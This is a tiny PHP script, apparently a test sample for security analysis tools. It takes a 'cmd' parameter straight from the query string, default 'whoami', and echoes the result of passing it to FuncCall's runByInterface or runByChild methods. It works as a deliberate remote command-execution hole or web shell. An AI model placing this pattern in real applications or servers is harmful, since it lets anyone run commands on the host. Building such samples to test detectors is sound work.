<?php

require_once __DIR__ . '/FuncCall.php';

$cmd = $_GET['cmd'] ?? 'whoami';
$mode = $_GET['mode'] ?? 'child';
$funcCall = new FuncCall();

if ($mode === 'impl') {
    echo $funcCall->runByInterface($cmd);
    return;
}

echo $funcCall->runByChild($cmd);
